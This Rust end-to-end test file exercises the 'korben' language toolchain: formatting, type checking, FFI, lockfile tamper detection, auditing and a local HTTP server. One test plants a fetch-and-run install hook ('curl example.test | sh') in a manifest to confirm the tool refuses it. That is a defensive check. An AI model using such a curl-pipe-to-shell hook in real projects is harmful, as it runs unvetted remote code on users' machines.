//! End-to-end tests that drive the `korben` executable.

// korben-6bc

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

const EXE: &str = env!("CARGO_BIN_EXE_korben");

/// A scratch directory that cleans itself up.
struct Scratch(PathBuf);

impl Scratch {
    fn new(label: &str) -> Scratch {
        let unique =
            format!("korben-test-{label}-{}-{:?}", std::process::id(), std::thread::current().id());
        let path = std::env::temp_dir().join(unique.replace(['(', ')', ' '], ""));
        let _ = std::fs::remove_dir_all(&path);
        std::fs::create_dir_all(&path).expect("create scratch directory");
        Scratch(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn korben(dir: &Path, args: &[&str]) -> Output {
    Command::new(EXE).args(args).current_dir(dir).env("NO_COLOR", "1").output().expect("run korben")
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).to_string()
}

fn combined(output: &Output) -> String {
    format!("{}{}", stdout(output), String::from_utf8_lossy(&output.stderr))
}

#[test]
fn version_and_help_are_available() {
    let scratch = Scratch::new("help");
    let version = korben(scratch.path(), &["version"]);
    assert!(version.status.success());
    assert!(stdout(&version).starts_with("korben "));

    let help = korben(scratch.path(), &["help"]);
    assert!(help.status.success());
    let text = stdout(&help);
    for command in ["new", "run", "check", "test", "fmt", "repl", "expand", "doc"] {
        assert!(text.contains(command), "help is missing `{command}`:\n{text}");
    }
}

#[test]
fn unknown_commands_fail_with_guidance() {
    let scratch = Scratch::new("unknown");
    let output = korben(scratch.path(), &["frobnicate"]);
    assert!(!output.status.success());
    assert!(combined(&output).contains("unknown command"));
}

#[test]
fn planned_commands_say_which_milestone_they_land_in() {
    let scratch = Scratch::new("planned");
    let output = korben(scratch.path(), &["lsp"]);
    assert!(!output.status.success());
    assert!(combined(&output).contains("Milestone"));
}

#[test]
fn commands_outside_a_project_explain_what_to_do() {
    let scratch = Scratch::new("noproject");
    let output = korben(scratch.path(), &["check"]);
    assert!(!output.status.success());
    let text = combined(&output);
    assert!(text.contains("korben.toml"), "{text}");
    assert!(text.contains("korben new"), "{text}");
}

/// The whole documented workflow: new, check, test, fmt, run, doc, build.
#[test]
fn the_standard_workflow_works_for_every_template() {
    for template in ["cli", "lib", "service"] {
        let scratch = Scratch::new(&format!("workflow-{template}"));
        let created = korben(scratch.path(), &["new", "app", "--template", template]);
        assert!(created.status.success(), "new failed:\n{}", combined(&created));
        let project = scratch.path().join("app");
        assert!(project.join("korben.toml").is_file());
        assert!(project.join("src/main.kb").is_file());

        let check = korben(&project, &["check"]);
        assert!(check.status.success(), "{template} check failed:\n{}", combined(&check));

        let test = korben(&project, &["test"]);
        assert!(test.status.success(), "{template} test failed:\n{}", combined(&test));
        assert!(stdout(&test).contains("passed"));

        // A freshly generated project is already canonically formatted.
        let fmt = korben(&project, &["fmt", "--check"]);
        assert!(fmt.status.success(), "{template} is not formatted:\n{}", combined(&fmt));

        let run = korben(&project, &["run"]);
        assert!(run.status.success(), "{template} run failed:\n{}", combined(&run));
        assert!(!stdout(&run).is_empty());

        let doc = korben(&project, &["doc"]);
        assert!(doc.status.success(), "{template} doc failed:\n{}", combined(&doc));
        assert!(project.join("target/doc/main.md").is_file());
        assert!(project.join("target/doc/api.json").is_file());

        // Native code generation is covered in depth by the differential
        // tests; here we only check the artifact appears where documented.
        let build = korben(&project, &["build", "--emit", "rust"]);
        assert!(build.status.success(), "{template} codegen failed:\n{}", combined(&build));
        assert!(stdout(&build).contains("fn main()"));
    }
}

#[test]
fn check_reports_type_errors_and_exits_non_zero() {
    let scratch = Scratch::new("typeerror");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::write(
        project.join("src/main.kb"),
        "(fn add [a: Int b: Int] -> Int (+ a b))\n(pub fn main [] -> Unit (add 1 \"two\"))\n",
    )
    .unwrap();
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();

    let output = korben(&project, &["check"]);
    assert!(!output.status.success());
    let text = combined(&output);
    assert!(text.contains("type-mismatch"), "{text}");
    assert!(text.contains("expected `Int`, found `String`"), "{text}");
}

#[test]
fn check_emits_machine_readable_json() {
    let scratch = Scratch::new("json");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::write(project.join("src/main.kb"), "(pub fn main [] -> Int \"text\")\n").unwrap();
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();

    let output = korben(&project, &["check", "--json"]);
    assert!(!output.status.success());
    let text = stdout(&output);
    assert!(text.starts_with("{\"diagnostics\":["), "{text}");
    assert!(text.contains("\"code\":\"type-mismatch\""), "{text}");
    assert!(text.contains("\"line\":"), "{text}");
}

#[test]
fn test_failures_are_reported_and_exit_non_zero() {
    let scratch = Scratch::new("failingtest");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::write(
        project.join("tests/main_test.kb"),
        "(module main_test)\n\n(test \"fails\"\n  (assert-eq 1 2))\n",
    )
    .unwrap();

    let output = korben(&project, &["test"]);
    assert!(!output.status.success());
    let text = combined(&output);
    assert!(text.contains("FAIL"), "{text}");
    assert!(text.contains("expected: 1"), "{text}");
}

#[test]
fn fmt_rewrites_files_and_check_mode_reports_without_writing() {
    let scratch = Scratch::new("fmt");
    let path = scratch.path().join("messy.kb");
    std::fs::write(&path, "(fn   add [a b]    (+   a   b))").unwrap();

    let check = korben(scratch.path(), &["fmt", "--check", "messy.kb"]);
    assert!(!check.status.success());
    assert!(combined(&check).contains("needs formatting"));
    assert_eq!(std::fs::read_to_string(&path).unwrap(), "(fn   add [a b]    (+   a   b))");

    let write = korben(scratch.path(), &["fmt", "messy.kb"]);
    assert!(write.status.success(), "{}", combined(&write));
    assert_eq!(std::fs::read_to_string(&path).unwrap(), "(fn add [a b]\n  (+ a b))\n");

    let again = korben(scratch.path(), &["fmt", "--check", "messy.kb"]);
    assert!(again.status.success(), "{}", combined(&again));
}

#[test]
fn run_accepts_a_single_file_and_program_arguments() {
    let scratch = Scratch::new("script");
    let path = scratch.path().join("script.kb");
    std::fs::write(
        &path,
        r#"(module script (use std.process :as process))

(pub fn main [] -> Unit !io
  (println (process.args)))
"#,
    )
    .unwrap();
    let output = korben(scratch.path(), &["run", "script.kb", "--", "one", "two"]);
    assert!(output.status.success(), "{}", combined(&output));
    assert_eq!(stdout(&output), "[\"one\" \"two\"]\n");
}

#[test]
fn expand_shows_macro_output_through_the_formatter() {
    let scratch = Scratch::new("expand");
    let path = scratch.path().join("m.kb");
    std::fs::write(&path, "(fn f [x] (when (> x 0) x))\n").unwrap();
    let output = korben(scratch.path(), &["expand", "m.kb"]);
    assert!(output.status.success(), "{}", combined(&output));
    assert_eq!(stdout(&output), "(fn f [x]\n  (if (> x 0) (do x) nil))\n");
}

#[test]
fn the_repl_evaluates_and_reports_types() {
    let scratch = Scratch::new("repl");
    let output = Command::new(EXE)
        .arg("repl")
        .current_dir(scratch.path())
        .env("NO_COLOR", "1")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .and_then(|mut child| {
            use std::io::Write;
            child.stdin.as_mut().unwrap().write_all(
                b"(+ 1 2)\n:type (map [1 2] inc)\n(fn double [n] (* n 2))\n(double 21)\n:quit\n",
            )?;
            child.wait_with_output()
        })
        .expect("run repl");
    let text = stdout(&output);
    assert!(text.contains("3 : Int"), "{text}");
    assert!(text.contains("Vec Int"), "{text}");
    assert!(text.contains("42"), "{text}");
}

#[test]
fn inspect_lists_the_resolved_project_model() {
    let scratch = Scratch::new("inspect");
    assert!(korben(scratch.path(), &["new", "app", "--template", "service"]).status.success());
    let output = korben(&scratch.path().join("app"), &["inspect"]);
    assert!(output.status.success(), "{}", combined(&output));
    let text = stdout(&output);
    assert!(text.contains("pub fn handle"), "{text}");
    assert!(text.contains("pub type AppError"), "{text}");
    assert!(text.contains("use std.json"), "{text}");
}

#[test]
fn doctor_reports_the_toolchain_and_project() {
    let scratch = Scratch::new("doctor");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let output = korben(&scratch.path().join("app"), &["doctor"]);
    assert!(output.status.success());
    let text = stdout(&output);
    assert!(text.contains("korben "), "{text}");
    assert!(text.contains("edition      2026"), "{text}");
    assert!(text.contains("modules"), "{text}");
}

#[test]
fn new_refuses_to_overwrite_an_existing_directory() {
    let scratch = Scratch::new("overwrite");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let second = korben(scratch.path(), &["new", "app"]);
    assert!(!second.status.success());
    assert!(combined(&second).contains("already exists"));
}

#[test]
fn the_bundled_examples_run_check_and_format_cleanly() {
    let examples = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .join("examples");
    let mut ran = 0usize;
    for entry in std::fs::read_dir(&examples).expect("read examples") {
        let path = entry.expect("example entry").path();
        if path.extension().map(|extension| extension != "kb").unwrap_or(true) {
            continue;
        }
        ran += 1;
        let file = path.to_str().unwrap();

        let check = korben(&examples, &["check", file]);
        assert!(check.status.success(), "check {file} failed:\n{}", combined(&check));

        let run = korben(&examples, &["run", file]);
        assert!(run.status.success(), "run {file} failed:\n{}", combined(&run));
        assert!(!stdout(&run).is_empty(), "{file} printed nothing");

        let fmt = korben(&examples, &["fmt", "--check", file]);
        assert!(fmt.status.success(), "{file} is not formatted:\n{}", combined(&fmt));
    }
    assert!(ran >= 2, "expected the examples directory to have examples");
}

// korben-qrt
/// Copy a directory tree, so a test may tamper with a checkout without dirtying it.
fn copy_tree(from: &Path, to: &Path) {
    std::fs::create_dir_all(to).expect("create destination");
    for entry in std::fs::read_dir(from).expect("read source") {
        let entry = entry.expect("directory entry");
        let target = to.join(entry.file_name());
        if entry.file_type().expect("file type").is_dir() {
            copy_tree(&entry.path(), &target);
        } else {
            std::fs::copy(entry.path(), &target).expect("copy file");
        }
    }
}

#[test]
fn the_packages_example_reproduces_its_committed_lockfile() {
    let example = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .join("examples")
        .join("packages");
    let scratch = Scratch::new("packages-example");
    let root = scratch.path().join("packages");
    copy_tree(&example, &root);
    let app = root.join("app");

    // The committed lockfile is what the example ships, and it is enough to build.
    let committed = std::fs::read_to_string(app.join("korben.lock")).expect("committed lock");
    let run = korben(&app, &["run"]);
    assert!(run.status.success(), "the example failed to run:\n{}", combined(&run));
    assert!(stdout(&run).contains("Hello, Ada!"), "unexpected output:\n{}", stdout(&run));

    // Resolving again from the same inputs writes the same bytes.
    std::fs::remove_file(app.join("korben.lock")).expect("remove the lock");
    let update = korben(&app, &["update"]);
    assert!(update.status.success(), "update failed:\n{}", combined(&update));
    let regenerated = std::fs::read_to_string(app.join("korben.lock")).expect("regenerated lock");
    assert_eq!(committed, regenerated, "the committed lockfile is not reproducible");

    // A dependency edited behind the lock stops the build rather than being used.
    let source = root.join("greeting").join("src").join("greeting.kb");
    let tampered = std::fs::read_to_string(&source).expect("read the dependency") + "\n;; edited\n";
    std::fs::write(&source, tampered).expect("tamper with the dependency");
    let after = korben(&app, &["run"]);
    assert!(!after.status.success(), "a changed dependency was accepted:\n{}", combined(&after));
    assert!(
        combined(&after).contains("has changed since it was locked"),
        "unexpected failure:\n{}",
        combined(&after)
    );
}

#[test]
fn ffi_generates_bindings_from_a_header_and_lists_them() {
    let scratch = Scratch::new("ffi");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("src/main.kb")).unwrap();
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(project.join("libc.h"), "size_t strlen(const char *s);\nint abs(int value);\n")
        .unwrap();

    // Generate a binding module from the header.
    let generated = korben(
        &project,
        &[
            "ffi",
            "c",
            "libc.h",
            "--library",
            "c",
            "--module",
            "bindings",
            "--out",
            "src/bindings.kb",
        ],
    );
    assert!(generated.status.success(), "{}", combined(&generated));
    assert!(stdout(&generated).contains("2 bindings"), "{}", stdout(&generated));

    let module = std::fs::read_to_string(project.join("src/bindings.kb")).unwrap();
    assert!(module.contains("(ffi/c-library \"c\")"), "{module}");
    assert!(module.contains("(pub ffi/c-fn strlen [s: CStr] -> CULong)"), "{module}");

    // Write a safe wrapper over the generated bindings and run it.
    std::fs::write(
        project.join("src/main.kb"),
        r#"(module main
  (use bindings [strlen abs]))

;;; Length of a string in bytes, as C counts it.
(pub fn byte-length [text: String] -> Int !ffi !unsafe
  (unsafe (strlen text)))

(pub fn main [] -> Unit !io !ffi !unsafe
  (println (byte-length "korben"))
  (println (unsafe (abs -9))))
"#,
    )
    .unwrap();

    let check = korben(&project, &["check"]);
    assert!(check.status.success(), "{}", combined(&check));

    let run = korben(&project, &["run"]);
    assert!(run.status.success(), "{}", combined(&run));
    assert_eq!(stdout(&run), "6\n9\n");

    // `korben ffi` reports what the project declares.
    let listed = korben(&project, &["ffi"]);
    assert!(listed.status.success(), "{}", combined(&listed));
    let text = stdout(&listed);
    assert!(text.contains("strlen"), "{text}");
    assert!(text.contains("(ffi/c-fn strlen [s: CStr] -> CULong)"), "{text}");
    assert!(text.contains("2 foreign declarations"), "{text}");
}

#[test]
fn calling_a_foreign_function_without_unsafe_is_rejected() {
    let scratch = Scratch::new("ffisafe");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(
        project.join("src/main.kb"),
        "(module main)\n\n(ffi/c-library \"c\")\n(ffi/c-fn abs [value: CInt] -> CInt)\n\n(pub fn main [] -> Unit !io !ffi !unsafe (println (abs -1)))\n",
    )
    .unwrap();

    let check = korben(&project, &["check"]);
    assert!(!check.status.success());
    let text = combined(&check);
    assert!(text.contains("unsafe-call"), "{text}");
    assert!(text.contains("wrap this in `(unsafe ...)`"), "{text}");
}

/// Build a small library package next to a project.
fn write_library(root: &Path, name: &str, version: &str, body: &str) {
    std::fs::create_dir_all(root.join("src")).unwrap();
    std::fs::write(
        root.join("korben.toml"),
        format!(
            "[package]\nname = \"{name}\"\nversion = \"{version}\"\nlicense = \"MIT\"\ndescription = \"test\"\nmain = \"{name}\"\n"
        ),
    )
    .unwrap();
    std::fs::write(root.join(format!("src/{name}.kb")), body).unwrap();
}

#[test]
fn a_path_dependency_is_added_locked_and_used() {
    let scratch = Scratch::new("deps");
    write_library(
        &scratch.path().join("shout"),
        "shout",
        "0.1.0",
        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
    );
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(
        project.join("src/main.kb"),
        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"hello\")))\n",
    )
    .unwrap();

    // Without the declaration the module is not visible.
    let before = korben(&project, &["check"]);
    assert!(!before.status.success());
    assert!(combined(&before).contains("cannot find module `shout`"), "{}", combined(&before));

    let added = korben(&project, &["add", "shout", "--path", "../shout"]);
    assert!(added.status.success(), "{}", combined(&added));
    assert!(stdout(&added).contains("shout 0.1.0"), "{}", stdout(&added));

    let lock = std::fs::read_to_string(project.join("korben.lock")).unwrap();
    assert!(lock.contains("[package.shout]"), "{lock}");
    assert!(lock.contains("source = \"path+../shout\""), "{lock}");
    assert!(lock.contains("checksum = \"sha256:"), "{lock}");

    let run = korben(&project, &["run"]);
    assert!(run.status.success(), "{}", combined(&run));
    assert_eq!(stdout(&run), "hello!\n");
}

#[test]
fn a_build_reproduces_from_the_lockfile_and_notices_a_change() {
    let scratch = Scratch::new("repro");
    let library = scratch.path().join("shout");
    write_library(
        &library,
        "shout",
        "0.1.0",
        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
    );
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(
        project.join("src/main.kb"),
        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"hi\")))\n",
    )
    .unwrap();
    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());

    let locked = std::fs::read_to_string(project.join("korben.lock")).unwrap();
    assert!(korben(&project, &["run"]).status.success());
    // Reproducing does not rewrite the lock.
    assert_eq!(std::fs::read_to_string(project.join("korben.lock")).unwrap(), locked);

    // A dependency that changed underneath the lock is an error, not a silent
    // difference. This is acceptance criterion 10.
    std::fs::write(
        library.join("src/shout.kb"),
        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}?\"))\n",
    )
    .unwrap();
    let changed = korben(&project, &["run"]);
    assert!(!changed.status.success());
    let text = combined(&changed);
    assert!(text.contains("has changed since it was locked"), "{text}");
    assert!(text.contains("korben update"), "{text}");

    // Accepting the change re-pins it.
    let updated = korben(&project, &["update"]);
    assert!(updated.status.success(), "{}", combined(&updated));
    assert_ne!(std::fs::read_to_string(project.join("korben.lock")).unwrap(), locked);
    let after = korben(&project, &["run"]);
    assert!(after.status.success(), "{}", combined(&after));
    assert_eq!(stdout(&after), "hi?\n");
}

#[test]
fn a_transitive_dependency_must_be_declared_to_be_imported() {
    let scratch = Scratch::new("transitive");
    let registry = scratch.path().join("registry");
    write_library(
        &registry.join("text/0.1.0"),
        "text",
        "0.1.0",
        "(module text)\n\n;;; Add emphasis.\n(pub fn shout [text: String] -> String (format \"{text}!\"))\n",
    );
    std::fs::create_dir_all(registry.join("greet/0.1.0/src")).unwrap();
    std::fs::write(
        registry.join("greet/0.1.0/korben.toml"),
        "[package]\nname = \"greet\"\nversion = \"0.1.0\"\nlicense = \"MIT\"\nmain = \"greet\"\n\n[dependencies]\ntext = \"^0.1\"\n",
    )
    .unwrap();
    std::fs::write(
        registry.join("greet/0.1.0/src/greet.kb"),
        "(module greet\n  (use text [shout]))\n\n;;; Greet loudly.\n(pub fn greet [name: String] -> String (shout name))\n",
    )
    .unwrap();

    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(
        project.join("src/main.kb"),
        "(module main\n  (use greet [greet])\n  (use text [shout]))\n\n(pub fn main [] -> Unit !io (println (greet \"a\")) (println (shout \"b\")))\n",
    )
    .unwrap();

    let added = Command::new(EXE)
        .args(["add", "greet", "--version", "^0.1"])
        .current_dir(&project)
        .env("NO_COLOR", "1")
        .env("KORBEN_REGISTRY", &registry)
        .output()
        .expect("add");
    assert!(added.status.success(), "{}", combined(&added));

    let check = Command::new(EXE)
        .arg("check")
        .current_dir(&project)
        .env("NO_COLOR", "1")
        .env("KORBEN_REGISTRY", &registry)
        .output()
        .expect("check");
    assert!(!check.status.success());
    let text = combined(&check);
    assert!(text.contains("does not declare a dependency on `text`"), "{text}");
    assert!(text.contains("korben add text"), "{text}");
}

#[test]
fn audit_verifies_the_lockfile_and_reports_weakened_settings() {
    let scratch = Scratch::new("audit");
    write_library(
        &scratch.path().join("shout"),
        "shout",
        "0.1.0",
        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [t: String] -> String (format \"{t}!\"))\n",
    );
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    std::fs::write(
        project.join("src/main.kb"),
        "(module main\n  (use shout [shout]))\n\n(pub fn main [] -> Unit !io (println (shout \"x\")))\n",
    )
    .unwrap();
    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());

    let audit = korben(&project, &["audit"]);
    assert!(audit.status.success(), "{}", combined(&audit));
    let text = stdout(&audit);
    assert!(text.contains("ok shout 0.1.0"), "{text}");
    assert!(text.contains("install scripts are prohibited"), "{text}");
    assert!(text.contains("checksums are verified"), "{text}");
    assert!(text.contains("not portable"), "a path dependency is worth flagging: {text}");

    // A weakened verification setting is reported, per specification 21.3.
    let weakened = Command::new(EXE)
        .arg("audit")
        .current_dir(&project)
        .env("NO_COLOR", "1")
        .env("KORBEN_SKIP_CHECKSUMS", "1")
        .output()
        .expect("audit");
    let text = stdout(&weakened);
    assert!(text.contains("KORBEN_SKIP_CHECKSUMS is set"), "{text}");
    assert!(text.contains("checksum verification is disabled"), "{text}");
}

#[test]
fn remove_drops_a_dependency() {
    let scratch = Scratch::new("remove");
    write_library(
        &scratch.path().join("shout"),
        "shout",
        "0.1.0",
        "(module shout)\n\n;;; Add emphasis.\n(pub fn shout [t: String] -> String t)\n",
    );
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    assert!(korben(&project, &["add", "shout", "--path", "../shout"]).status.success());
    assert!(std::fs::read_to_string(project.join("korben.toml")).unwrap().contains("shout"));

    let removed = korben(&project, &["remove", "shout"]);
    assert!(removed.status.success(), "{}", combined(&removed));
    let manifest = std::fs::read_to_string(project.join("korben.toml")).unwrap();
    assert!(!manifest.contains("shout"), "{manifest}");
}

#[test]
fn a_manifest_declaring_an_install_script_is_refused() {
    let scratch = Scratch::new("install");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    let manifest = std::fs::read_to_string(project.join("korben.toml")).unwrap();
    std::fs::write(
        project.join("korben.toml"),
        manifest.replace("[package]", "[package]\ninstall = \"curl example.test | sh\""),
    )
    .unwrap();

    let check = korben(&project, &["check"]);
    assert!(!check.status.success());
    let text = combined(&check);
    assert!(text.contains("would run code at install time"), "{text}");
    assert!(text.contains("21.3"), "{text}");
}

/// A port nothing is listening on right now.
fn free_port() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
    let port = listener.local_addr().expect("addr").port();
    drop(listener);
    port
}

/// Send one request and read the whole response.
fn request(port: u16, raw: &str) -> String {
    use std::io::{Read, Write};
    // The server needs a moment to bind, so connecting is retried briefly.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    let mut stream = loop {
        match std::net::TcpStream::connect(("127.0.0.1", port)) {
            Ok(stream) => break stream,
            Err(error) if std::time::Instant::now() < deadline => {
                std::thread::sleep(std::time::Duration::from_millis(20));
                let _ = error;
            }
            Err(error) => panic!("could not reach the server on {port}: {error}"),
        }
    };
    stream.set_read_timeout(Some(std::time::Duration::from_secs(10))).unwrap();
    stream.write_all(raw.as_bytes()).expect("write");
    stream.flush().expect("flush");
    let mut response = String::new();
    stream.read_to_string(&mut response).expect("read");
    response
}

/// The server is real: it binds a socket, speaks HTTP/1.1, and answers a client
/// that knows nothing about Korben.
#[test]
fn the_http_server_answers_a_real_client() {
    let scratch = Scratch::new("http");
    assert!(korben(scratch.path(), &["new", "app"]).status.success());
    let project = scratch.path().join("app");
    std::fs::remove_file(project.join("tests/main_test.kb")).unwrap();
    let port = free_port();
    std::fs::write(
        project.join("src/main.kb"),
        format!(
            r#"(module main
  (use std.http :as http)
  (use std.json :as json))

;;; Route a request to a response.
(pub fn handle [request: http.Request] -> http.Response
  (match request
    {{:method :get :path "/health"}} (http.text 200 "ok")
    {{:method :get :path "/greeting" :query {{"name" name}}}}
      (http.json 200 (json.encode {{message name}}))
    {{:method :post :path "/echo"}} (http.text 200 request.body)
    _ (http.not-found)))

(pub fn main [] -> Unit !io
  (match (http.serve "127.0.0.1:{port}" handle)
    (Ok _) nil
    (Err error) (println "server stopped:" (http.describe error))))
"#
        ),
    )
    .unwrap();

    let check = korben(&project, &["check"]);
    assert!(check.status.success(), "{}", combined(&check));

    let mut server = Command::new(EXE)
        .arg("run")
        .current_dir(&project)
        .env("NO_COLOR", "1")
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("start the server");

    let health = request(port, "GET /health HTTP/1.1\r\nhost: localhost\r\n\r\n");
    assert!(health.starts_with("HTTP/1.1 200 OK\r\n"), "{health:?}");
    assert!(health.contains("content-length: 2\r\n"), "{health:?}");
    assert!(health.ends_with("\r\n\r\nok"), "{health:?}");

    let greeting = request(port, "GET /greeting?name=Ada HTTP/1.1\r\nhost: localhost\r\n\r\n");
    assert!(greeting.contains("content-type: application/json"), "{greeting:?}");
    assert!(greeting.ends_with("{\"message\":\"Ada\"}"), "{greeting:?}");

    // A body is read using `content-length`, not guessed at.
    let echo = request(
        port,
        "POST /echo HTTP/1.1\r\nhost: localhost\r\ncontent-length: 11\r\n\r\nhello there",
    );
    assert!(echo.ends_with("\r\n\r\nhello there"), "{echo:?}");

    let missing = request(port, "GET /nowhere HTTP/1.1\r\nhost: localhost\r\n\r\n");
    assert!(missing.starts_with("HTTP/1.1 404 Not Found\r\n"), "{missing:?}");

    let _ = server.kill();
    let _ = server.wait();
}

/// The client and the server speak to each other, in separate processes.
#[test]
fn the_http_client_talks_to_the_http_server() {
    let scratch = Scratch::new("httpclient");
    assert!(korben(scratch.path(), &["new", "server"]).status.success());
    assert!(korben(scratch.path(), &["new", "client"]).status.success());
    let server_project = scratch.path().join("server");
    let client_project = scratch.path().join("client");
    std::fs::remove_file(server_project.join("tests/main_test.kb")).unwrap();
    std::fs::remove_file(client_project.join("tests/main_test.kb")).unwrap();
    let port = free_port();

    std::fs::write(
        server_project.join("src/main.kb"),
        format!(
            r#"(module main
  (use std.http :as http))

;;; Answer every request the same way.
(pub fn handle [request: http.Request] -> http.Response
  (http.text 200 (str "you asked for " request.path)))

(pub fn main [] -> Unit !io
  (match (http.serve "127.0.0.1:{port}" handle)
    (Ok _) nil
    (Err error) (println "server stopped:" (http.describe error))))
"#
        ),
    )
    .unwrap();
    std::fs::write(
        client_project.join("src/main.kb"),
        format!(
            r#"(module main
  (use std.http :as http))

(pub fn main [] -> Unit !io
  (match (http.get-url "http://127.0.0.1:{port}/hello")
    (Ok response) (println response.status response.body)
    (Err error) (println "error:" (http.describe error))))
"#
        ),
    )
    .unwrap();

    let mut server = Command::new(EXE)
        .arg("run")
        .current_dir(&server_project)
        .env("NO_COLOR", "1")
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("start the server");

    // Wait for the socket to be accepting before the client runs.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while std::net::TcpStream::connect(("127.0.0.1", port)).is_err() {
        assert!(std::time::Instant::now() < deadline, "the server never bound {port}");
        std::thread::sleep(std::time::Duration::from_millis(20));
    }

    let client = korben(&client_project, &["run"]);
    let _ = server.kill();
    let _ = server.wait();
    assert!(client.status.success(), "{}", combined(&client));
    assert_eq!(stdout(&client), "200 you asked for /hello\n");
}
